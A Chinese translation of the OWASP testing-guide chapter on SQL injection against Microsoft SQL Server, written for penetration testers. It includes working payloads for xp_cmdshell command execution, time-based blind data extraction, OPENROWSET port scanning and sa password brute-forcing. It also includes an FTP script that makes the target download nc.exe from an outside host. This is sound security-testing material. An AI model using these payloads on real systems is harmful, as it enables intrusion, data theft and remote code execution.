# SQL

## 概述

本节将讨论利用 Microsoft SQL Server 特定功能的一些 [SQL 注入](https://owasp.org/www-community/attacks/SQL_Injection) 技术。

当输入数据在构建 SQL 查询时未被充分约束或净化，就会产生 SQL 注入漏洞。使用动态 SQL（通过字符串拼接构建 SQL 查询）极易引发此类漏洞。SQL 注入可使攻击者访问 SQL 服务器，并在用于连接数据库的用户权限下执行 SQL 代码。

如 [SQL 注入](https://owasp.org/www-community/attacks/SQL_Injection) 所述，SQL 注入利用需具备两个条件：入口点和注入利用途径。任何由应用程序处理的用户可控参数均可能隐藏漏洞，包括：

-   查询字符串中的应用程序参数（例如 GET 请求）
-   POST 请求正文中包含的应用程序参数
-   浏览器相关信息（例如用户代理、来源页面）
-   主机相关信息（例如主机名、IP 地址）
-   会话相关信息（例如用户 ID、Cookie）

Microsoft SQL Server 具有若干独有特性，因此部分利用技术需针对此数据库进行专门定制。

## 测试方法

### SQL Server 特性

首先，我们来看一些在 SQL 注入测试中有用的 SQL Server 操作符和命令/存储过程：

-   注释操作符：`--`（用于强制查询忽略原始查询的剩余部分；并非所有情况都需要）
-   查询分隔符：`;`（分号）
-   有用的存储过程包括：
    -   [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql)：使用当前运行权限在服务器上执行任意命令行解释器。默认情况下，仅允许 `sysadmin` 角色使用它，并且在 SQL Server 2005 中默认禁用（可以使用 sp_configure 重新启用）
    -   `xp_regread`：从注册表中读取任意值（未公开的扩展过程）
    -   `xp_regwrite`：向注册表中写入任意值（未公开的扩展过程）
    -   [sp_makewebtask](https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2008/ms180099(v=sql.100))：生成一个 Windows 命令行解释器并传入字符串执行。任何输出都会作为文本行返回。它需要 `sysadmin` 权限。
    -   [xp_sendmail](https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/ms189505(v=sql.105))：向指定的收件人发送电子邮件，邮件可能包含查询结果集附件。此扩展存储过程使用 SQL Mail 发送消息。

现在让我们看一些使用前述函数的特定 SQL Server 攻击示例。大多数示例将使用 `exec` 函数。

以下展示了如何执行一个 shell 命令，该命令将 `dir c:\inetpub` 命令的输出写入一个可浏览的文件中，前提是 Web 服务器和数据库服务器位于同一主机上。以下语法使用 `xp_cmdshell`：

`exec master.dbo.xp_cmdshell 'dir c:\inetpub > c:\inetpub\wwwroot\test.txt'--`

或者，我们可以使用 `sp_makewebtask`：

`exec sp_makewebtask 'C:\Inetpub\wwwroot\test.txt', 'select * from master.dbo.sysobjects'--`

成功执行将创建一个渗透测试人员可以浏览的文件。请注意，`sp_makewebtask` 已被弃用，并且即使它在所有直至 2005 版本的 SQL Server 中都能工作，但在未来版本中可能会被移除。

此外，SQL Server 的内置函数和环境变量非常实用。以下使用函数 `db_name()` 来触发一个将返回数据库名称的错误：

`/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20db_name())`

注意使用 [convert](https://docs.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql?view=sql-server-2017) 函数：

`CONVERT ( data_type [ ( length ) ] , expression [ , style ] )`

`CONVERT` 会尝试将 `db_name` 的结果（一个字符串）转换为整数变量，从而触发错误。如果该错误被易受攻击的应用程序显示出来，其中将包含数据库的名称。

以下示例使用环境变量 `@@version`，结合 `union select` 风格的注入，以获取 SQL Server 的版本信息：

`/form.asp?prop=33%20union%20select%201,2006-01-06,2007-01-06,1,'stat','name1','name2',2006-01-06,1,@@version%20--`

下面是相同的攻击方式，但再次使用了类型转换技巧：

`/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20@@VERSION)`

信息收集对于通过 SQL 注入攻击或直接访问 SQL 监听器来利用 SQL Server 上的软件漏洞非常有用。

接下来，我们将展示多个通过不同入口点利用 SQL 注入漏洞的示例。

### 示例1：测试 GET 请求中的 SQL 注入

最简单（有时也是最有效）的情况是登录页面要求输入用户名和密码进行用户登录。您可以尝试输入以下字符串 `' or '1'='1` ：

`https://vulnerable.web.app/login.asp?Username='%20or%20'1'='1&Password='%20or%20'1'='1`

如果应用程序使用动态 SQL 查询，并且该字符串被附加到用户凭据验证查询中，这可能会导致成功登录应用程序。

### 示例2：测试 GET 请求中的 SQL 注入

为了了解存在多少列：

`https://vulnerable.web.app/list_report.aspx?number=001%20UNION%20ALL%201,1,'a',1,1,1%20FROM%20users;--`

### 示例3：测试 POST 请求中的 SQL 注入

SQL 注入，HTTP POST 内容：`email=%27&whichSubmit=submit&submit.x=0&submit.y=0`

一个完整的 POST 请求示例（`https://vulnerable.web.app/forgotpass.asp`）：

```http
POST /forgotpass.asp HTTP/1.1
Host: vulnerable.web.app
[...]
Referer: https://vulnerable.web.app/forgotpass.asp
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

email=%27&whichSubmit=submit&submit.x=0&submit.y=0
```

当在邮箱字段输入 `'`（单引号）字符时获得的错误信息为：

```txt
Microsoft OLE DB Provider for SQL Server error '80040e14'
Unclosed quotation mark before the character string '' '.
/forgotpass.asp, line 15
```

### 示例4：另一个（实用的）GET 请求示例

获取应用程序源代码

`a' ; master.dbo.xp_cmdshell ' copy c:\inetpub\wwwroot\login.aspx c:\inetpub\wwwroot\login.txt';--`

### 示例5：自定义 `xp_cmdshell`

所有描述 SQL Server 安全最佳实践的书籍和论文都建议在 SQL Server 2000 中禁用 `xp_cmdshell`（在 SQL Server 2005 中默认已禁用）。然而，如果我们拥有 sysadmin 权限（本身具有或通过暴力破解 sysadmin 密码获得，见下文），通常可以绕过此限制。

在 SQL Server 2000 上：

-   如果 `xp_cmdshell` 已通过 `sp_dropextendedproc` 禁用，我们可以简单地注入以下代码：

`sp_addextendedproc 'xp_cmdshell','xp_log70.dll'`

-   如果上述代码不起作用，则意味着 `xp_log70.dll` 已被移动或删除。在这种情况下，我们需要注入以下代码：

```sql
CREATE PROCEDURE xp_cmdshell(@cmd varchar(255), @Wait int = 0) AS

    DECLARE @result int, @OLEResult int, @RunResult int
    DECLARE @ShellID int

    EXECUTE @OLEResult = sp_OACreate 'WScript.Shell', @ShellID OUT
    -- @ShellID 变量得到 WScript.Shell 对象的句柄
    -- @OLEResult 保持返回值并在之后，当返回值非零时触发错误
    IF @OLEResult <> 0 SELECT @result = @OLEResult
    IF @OLEResult <> 0 RAISERROR ('CreateObject %0X', 14, 1, @OLEResult)

    EXECUTE @OLEResult = sp_OAMethod @ShellID, 'Run', Null, @cmd, 0, @Wait
    -- 调用 WScript.Shell 对象的 Run 方法
    -- sp_OAMethod 对象，方法，返回值，命令，显示模式，同步控制
    IF @OLEResult <> 0 SELECT @result = @OLEResult
    IF @OLEResult <> 0 RAISERROR ('Run %0X', 14, 1, @OLEResult)

    EXECUTE @OLEResult = sp_OADestroy @ShellID
    return @result
```

这段由 Antonin Foller 编写的代码（参见页面底部链接）利用 `sp_oacreate`、`sp_oamethod` 和 `sp_oadestroy` 创建了一个新的 `xp_cmdshell`（当然，前提是这些存储过程也未被禁用）。在使用前，需要先删除之前创建的 `xp_cmdshell`（即使其未生效），否则两个声明会产生冲突。

在 SQL Server 2005 中，可通过注入以下代码启用 `xp_cmdshell`：

```sql
master..sp_configure 'show advanced options',1
reconfigure
master..sp_configure 'xp_cmdshell',1
reconfigure
```

### 示例6：来源页/用户代理头部注入

将`REFERER`请求头设置为：

`Referer: https://vulnerable.web.app/login.aspx', 'user_agent', 'some_ip'); [SQL代码]--`

可导致任意SQL代码执行。同理，将User-Agent请求头设置为：

`User-Agent: user_agent', 'some_ip'); [SQL代码]--`

也会产生相同效果。
<!--  -->
头部注入并非特性,或可删除
<!--  -->
### 示例7：利用SQL Server进行端口扫描

在SQL Server中，OPENROWSET命令对渗透测试人员极为实用，该命令用于在另一个数据库服务器上执行查询并返回结果。渗透测试人员可通过注入以下查询，扫描目标网络中其他主机的端口：

`select * from OPENROWSET('SQLOLEDB','uid=sa;pwd=foobar;Network=DBMSSOCN;Address=x.y.w.z,p;timeout=5','select 1')--`

此查询将尝试连接地址x.y.w.z的端口p。若端口关闭，将返回以下信息：

`SQL Server does not exist or access denied`

若端口开放，则会返回以下错误之一：

`General network error. Check your network documentation`

`OLE DB provider 'sqloledb' reported an error. The provider did not give any information about the error.`

需注意，错误信息并非总能获取。此时可通过响应时间判断端口状态：关闭端口将耗尽超时时长（本例为5秒），而开放端口会立即返回结果。

需要注意的是，OPENROWSET在SQL Server 2000中默认启用，但在SQL Server 2005中默认禁用。

### 示例8：可执行文件上传

当能够使用`xp_cmdshell`（系统原生或自定义版本）时，渗透测试人员可轻松向目标数据库服务器上传可执行文件。通常选择上传`netcat.exe`，但任何木马程序均可实现此目的。若目标服务器被允许向测试机发起FTP连接，只需注入以下查询：

```sql
-- 逐步构建脚本文件后执行

exec master..xp_cmdshell 'echo open ftp.tester.org > ftpscript.txt';--
exec master..xp_cmdshell 'echo USER >> ftpscript.txt';--
exec master..xp_cmdshell 'echo PASS >> ftpscript.txt';--
-- 创建 .txt 文件并写入ftp服务器地址，之后追加凭证

exec master..xp_cmdshell 'echo bin >> ftpscript.txt';--
exec master..xp_cmdshell 'echo get nc.exe >> ftpscript.txt';--
exec master..xp_cmdshell 'echo quit >> ftpscript.txt';--
-- 启用二进制模式传输，下载nc工具，退出ftp会话

exec master..xp_cmdshell 'ftp -s:ftpscript.txt';--
-- 使用 ftp -s 执行构建的脚本
```

此时，`nc.exe`将被成功上传并可用。

若防火墙禁止FTP连接，可通过利用Windows系统默认安装的调试工具`debug.exe`实现绕过。该工具支持脚本化操作，可通过执行特定脚本文件生成可执行文件。具体操作流程为：先将可执行文件转换为调试脚本（纯ASCII文件），逐行上传后调用`debug.exe`处理。现有多种工具可生成此类调试文件（如Ollie Whitehouse开发的`makescr.exe`和`toolcrypt.org`的`dbgtool.exe`）。需注入的查询如下：

```sql
exec master..xp_cmdshell 'echo [debug script line #1 of n] > debugscript.txt';--
exec master..xp_cmdshell 'echo [debug script line #2 of n] >> debugscript.txt';--
....
exec master..xp_cmdshell 'echo [debug script line #n of n] >> debugscript.txt';--
exec master..xp_cmdshell 'debug.exe < debugscript.txt';--
```

至此，可执行文件已成功部署在目标机器上等待运行。该过程可通过工具自动化实现，最典型的是Windows平台的`Bobcat`和Unix平台的`Sqlninja`（详见本页底部工具列表）。

### 在未显示时获取信息的带外攻击

当Web应用程序未返回任何信息（例如描述性错误消息，参见[盲SQL注入](https://owasp.org/www-community/attacks/Blind_SQL_Injection)）时，并非无计可施。例如，可能遇到可访问源代码的情况（如Web应用程序基于开源软件）。此时，渗透测试人员可离线利用在该Web应用中发现的全部SQL注入漏洞。尽管入侵防御系统可能拦截部分攻击，最佳实践应遵循以下流程：在为该目的创建的测试环境中开发并测试攻击方案，随后针对被测Web应用程序执行这些攻击。

其他带外攻击方案详见[上文示例4/WSTG](#example-4-yet-another-useful-get-example)。

### 盲注SQL注入攻击

#### 试错法

另一种方式是尝试运气。即攻击者假设Web应用程序中存在盲注或带外SQL注入漏洞，随后选择一个攻击向量（例如Web输入点），对该通道[使用模糊测试向量/WSTG](../../6-Appendix/C-Fuzz_Vectors.md)并观察响应。例如，若Web应用程序通过查询语句检索书籍：

```sql
select * from books where title="text entered by the user"
```

渗透测试人员可能输入文本：`'Bomba' OR 1=1--`。若数据未经验证，查询将执行并返回全部书籍列表，这证明存在SQL注入漏洞。渗透测试人员可后续对查询进行“试探”以评估漏洞严重性。

> **注意：** 向SQL查询注入条件`OR 1=1`时需谨慎。虽然初始注入场景可能无害，但应用程序常将单个请求的数据用于多个不同查询。若该条件进入UPDATE或DELETE语句，可能导致意外数据丢失。


#### 如果显示多条错误信息

另一方面，即使没有先验信息可用，攻击者仍可能通过利用任何隐蔽信道（covert channel）进行攻击。描述性错误消息可能被拦截，但错误消息本身仍会泄露某些信息。例如：

- 某些情况下，Web应用程序（实际上是Web服务器）可能返回传统的 `500: Internal Server Error`，例如当应用程序因未闭合引号的查询等操作产生异常时。
- 而在其他情况下，服务器会返回 `200 OK` 消息，但Web应用程序会返回开发人员插入的错误消息，例如`Internal server error`或`bad data`。

这一信息可能足以让攻击者理解Web应用程序如何构建动态SQL查询，并据此调整攻击方案。另一种带外方法是通过HTTP可浏览文件输出结果。

#### 时间盲注攻击

当应用程序没有可见反馈时，还存在另一种实施盲SQL注入攻击的可能性：通过测量Web应用程序响应请求所需的时间。[Anley](https://web.archive.org/web/20160413052024/https://www.encription.co.uk/downloads/more_advanced_sql_injection.pdf)描述了此类攻击，以下示例取自该文献。典型方法使用`waitfor delay`命令：假设攻击者要检查`pubs`示例数据库是否存在，只需注入以下命令：

`if exists (select * from pubs..pub_info) waitfor delay '0:0:5'`

根据查询返回所需的时间，我们将得到答案。实际上，这里涉及两个要素：SQL注入漏洞和允许渗透测试人员每次查询获取1比特信息的隐蔽信道。因此，通过多次查询（次数取决于所需信息的比特数），渗透测试人员可以获取数据库中的任意数据。请看以下查询：

```sql
declare @s varchar(8000)
declare @i int
select @s = db_name()
select @i = [some value]
if (select len(@s)) < @i waitfor delay '0:0:5'
```

通过测量响应时间并为`@i`使用不同的值，我们可以推断出当前数据库名称的长度，然后通过以下查询开始提取名称本身：

`if (ascii(substring(@s, @byte, 1)) & ( power(2, @bit))) > 0 waitfor delay '0:0:5'`
<!--  -->
`substring(表达式，起始位置，长度)`
此处提取字节后再提取此字节的每一位，完成后开始下一个字节的循环
<!--  -->

如果当前数据库名称第`@byte`字节的第`@bit`位为1，此查询将等待5秒；若为0则立即返回。通过嵌套两个循环（一个用于`@byte`，一个用于`@bit`），我们将能够提取出全部信息。

然而，可能会出现`waitfor`命令不可用的情况（例如被入侵防御系统/Web应用防火墙过滤）。这并不意味着无法进行盲SQL注入攻击，因为渗透测试人员只需提出任何未被过滤的耗时操作即可。例如

```sql
-- 递增循环

declare @i int 
select @i = 0
while @i < 0xaffff begin
select @i = @i + 1
end
```

#### 版本与漏洞检测

同样的时间检测方法也可用于识别所应对的SQL Server版本。当然，我们将利用内置变量`@@version`。参考以下查询：

`select @@version`

在SQL Server 2005上，其返回结果示例如下：

`Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) Oct 14 2005 00:33:37`

字符串中的`2005`部分位于第22至第25个字符区间。因此，可注入的查询如下：

`if substring((select @@version),25,1) = 5 waitfor delay '0:0:5'`

若`@@version`变量的第25个字符为`5`，该查询将等待5秒，表明目标为SQL Server 2005。若查询立即返回，则可能为SQL Server 2000，可通过类似查询进一步验证。

### 示例9：系统管理员密码暴力破解

要暴力破解系统管理员密码，我们可以利用`OPENROWSET`需要正确凭证才能成功建立连接的特性，且该连接可"循环"指向本地数据库服务器。结合基于响应时间的推理注入攻击，可注入以下代码：

`select * from OPENROWSET('SQLOLEDB','';'sa';'<密码>','select 1;waitfor delay ''0:0:5'' ')`

此处通过`sa`和`<密码>`作为凭证尝试连接本地数据库（由`SQLOLEDB`后的空字段指定）。若密码正确且连接成功，查询将被执行，使数据库等待5秒（同时返回值，因OPENROWSET需至少一列）。从字典获取候选密码并测量每次连接耗时，即可尝试推测正确密码。David Litchfield在"Data-mining with SQL Injection and Inference"中进一步推进该技术，通过注入代码利用数据库服务器自身的CPU资源进行系统管理员密码暴力破解。

获取系统管理员密码后有两种选择：
- 后续查询均通过`OPENROWSET`注入以使用系统管理员权限
- 使用`sp_addsrvrolemember`将当前用户添加至系统管理员(sysadmin)组。可通过推理注入针对`system_user`变量提取当前用户名

需注意：OPENROWSET在SQL Server 2000中向所有用户开放，但在SQL Server 2005中仅限管理员账户使用。

## 工具

- [sqlmap，自动化SQL注入工具](https://sqlmap.org/)

## 参考文献

- [WSTG-INPV-05-03](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server.md)

### 白皮书

- [David Litchfield: 《利用SQL注入与推理的数据挖掘》](https://dl.packetstormsecurity.net/papers/attack/sqlinference.pdf)
- [Chris Anley: 《（更）高级SQL注入》](https://www.cgisecurity.com/lib/more_advanced_sql_injection.pdf)
- [Alexander Chigrik: 《实用的未公开扩展存储过程》](https://www.databasejournal.com/features/mssql/article.php/1441251/Useful-Undocumented-Extended-Stored-Procedures.htm)
- [Antonin Foller: 《自定义xp_cmdshell：使用Shell对象》](https://www.motobit.com/tips/detpg_cmdshell)
- [SQL注入](https://www.cisecurity.org/wp-content/uploads/2017/05/SQL-Injection-White-Paper.pdf)
- [Cesar Cerrudo: 《利用SQL注入操纵Microsoft SQL Server：文件上传、渗透内网、端口扫描、拒绝服务攻击》](https://www.cgisecurity.com/lib/Manipulating_SQL_Server_Using_SQL_Injection.pdf)
